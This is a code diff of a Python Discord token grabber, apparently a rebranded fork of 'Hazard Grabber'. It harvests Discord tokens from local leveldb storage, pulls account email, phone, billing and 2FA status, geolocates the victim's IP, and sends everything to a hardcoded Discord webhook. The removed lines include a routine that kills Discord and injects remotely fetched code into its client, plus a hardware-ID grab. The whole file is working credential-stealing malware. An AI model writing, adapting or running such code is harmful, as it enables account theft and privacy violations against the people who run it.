@@ -1,18 +1,13 @@
 import os
-if os.name != "nt":
-	exit()
-from re import findall
 import json
-import psutil
 import platform as plt
-from json import loads, dumps
+from re import findall
 from base64 import b64decode
-from subprocess import Popen, PIPE
-from urllib.request import Request, urlopen
 from datetime import datetime
+from json import loads, dumps
+from urllib.request import Request, urlopen
 
 webhook_url = "https://discord.com/api/webhooks/887892536763482133/DAjRRvX91MkV2U-QruEIIZ6iqcannF9l9B1PHhikC_yBc8CDlTiQBew6zz5AFCWOA_DN"
-password_stealer = True
 
 languages = {
 	'da'    : 'Danish, Denmark',
@@ -51,11 +46,12 @@ PATHS = {
 	"Discord"           : ROAMING + "\\Discord",
 	"Discord Canary"    : ROAMING + "\\discordcanary",
 	"Discord PTB"       : ROAMING + "\\discordptb",
-	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
+	"Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
 	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
+	"Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+	"Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
 }
+
 def getheaders(token=None, content_type="application/json"):
 	headers = {
 		"Content-Type": content_type,
@@ -64,11 +60,13 @@ def getheaders(token=None, content_type="application/json"):
 	if token:
 		headers.update({"Authorization": token})
 	return headers
+
 def getuserdata(token):
 	try:
 		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
 	except:
 		pass
+
 def gettokens(path):
 	path += "\\Local Storage\\leveldb"
 	tokens = []
@@ -80,10 +78,6 @@ def gettokens(path):
 				for token in findall(regex, line):
 					tokens.append(token)
 	return tokens
-
-def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 
 def getip():
 	ip = org = loc = city = country = region = googlemap = "None"
@@ -117,9 +111,12 @@ def has_payment_methods(token):
 		pass
 
 def main():
+	global webhook_url
+	cache_path = ROAMING + "\\.cache~$"
 	embeds = []
 	working = []
 	checked = []
+	already_cached_tokens = []
 	working_ids = []
 	computer_os = plt.platform()
 	ip,org,loc,city,country,region,googlemap = getip()
@@ -154,119 +151,61 @@ def main():
 			phone = user_data.get("phone")
 			verified = user_data['verified']
 			mfa_enabled = user_data['mfa_enabled']
-			flags = user_data['flags']
-			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')
+			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
 			language = languages.get(locale)
-			if not language:
-				language = "Failed to get language"
-
 			nitro = bool(user_data.get("premium_type"))
 			billing = bool(has_payment_methods(token))
 			embed = {
-				"color": 16507654,
+				"color": 0x34393e,
 				"fields": [
 					{
-						"name": "**Account Info**",
-						"value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-						"inline": True
-					},
-					{
-						"name": "**Pc Info**",
-						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
-						"inline": True
-					},
-					{
-						"name": "--------------------------------------------------------------------------------------------------",
-						"value":"-----------------------------------------------------------------------------------------------",
-						"inline": False
-					},
-					{
-						"name": "**IP**",
-						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
-						"inline": True
-					},
-					{
-						"name": "**Other Info**",
-						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
-						"inline": True
-					},
-					{
-						"name": "**Token**",
-						"value": f"`{token}`",
-						"inline": False
-					}
+        				"name": "**Account information**",
+        				"value": f'`E-mail:` ||{email}||\n`Phone number:` ||{phone}||\n`Nitro:` {nitro}\n`Billing Info:` {billing}'
+        			},
+        			{
+        				"name": "**PC information**",
+        				"value": f'`Operating System:` {computer_os}\n`PC name:` {pc_username}\n`PC ID:` {pc_name}\n`Token location:` {platform}'
+        			},
+        			{
+    					"name": "**IP information**",
+        				"value": f'`IP:` ||{ip}||\n`Geo:` ||[{loc}]({googlemap})||\n`City:` ||{city}||\n`Region:` ||{region}||'
+        			},
+        			{
+        				"name": "**Other information**",
+        				"value": f'`Language:` {locale} ({language})\n`E-mail Verification:` {verified}\n`2FA/MFA Activated:` {mfa_enabled}\n`Creation Date:` {creation_date}'
+        			},
+        			{
+        				"name": "**Token**",
+        				"value": f':warning: `Token:` ||{token}||'
+        			}
 				],
 				"author": {
-					"name": f"{username}・{user_id}",
+					"name": f"User name: {username}  |  User ID: {user_id}",
 					"icon_url": avatar_url
 				},
 				"footer": {
-					"text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Token-Grabber"
+					"text": f"made by yuma"
 				}
 			}
 			embeds.append(embed)
-
+	with open(cache_path, "a") as file:
+		for token in checked:
+			if not token in already_cached_tokens:
+				file.write(token + "\n")
 	if len(working) == 0:
 		working.append('123')
 	webhook = {
 		"content": "",
 		"embeds": embeds,
-		"username": "Hazard Grabber",
-		"avatar_url": "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg"
+		"username": "webhooker",
+		"avatar_url": "https://i.imgur.com/ERnLEaV.png"
 	}
 	try:
 		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
 	except:
 		pass
-
-def HazardStealer():
-	for proc in psutil.process_iter():
-		if any(procstr in proc.name() for procstr in\
-		['discord', 'Discord', 'DISCORD',]):
-			proc.kill()
-	try:
-		for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
-			for name in dirs:
-				if (name.__contains__("discord_desktop_core-")):
-					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
-					f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
-					index_content = f.read()
-					with open(directory_list, 'wb') as index_file:
-						index_file.write(index_content)
-					with open(directory_list, 'r+') as index_file2:
-						replace_string = index_file2.read().replace("%WEBHOOK_LINK%", webhook_url)
-					with open(directory_list, 'w'): pass
-					with open(directory_list, 'r+') as index_file3:
-						index_file3.write(replace_string)
-		for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
-			for name in files:
-				discord_file = os.path.join(root, name)
-				os.startfile(discord_file)
-	except:
-		pass
-
-if password_stealer:
-    HazardStealer()
 try:
 	main()
 except Exception as e:
-    embeds2 = []
-    webhook2 = {
-		"content": "",
-		"embeds": embeds2,
-		"username": "Hazard Err",
-		"avatar_url": "https://cdn.discordapp.com/attachments/828047793619861557/884194764159848458/pixlr-bg-result_10.png"
-	}
-    embed2 = {
-		"color": 15007744,
-        "author": {
-            "name": "Woopsie daisy",
-            "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/884194764159848458/pixlr-bg-result_10.png",
-            "url": "https://github.com/Rdimo/Hazard-Nuker#important"
-        },
-        "description": f"**Hazard Grabber Caught Error:**\n```fix\n{e}```\n They ran the file but Seems like Hazard couldn't grab their info :(",
-        }
-    embeds2.append(embed2)    
-    urlopen(Request(webhook_url, data=dumps(webhook2).encode(), headers=getheaders()))
-    pass
+	print(e)
+	pass
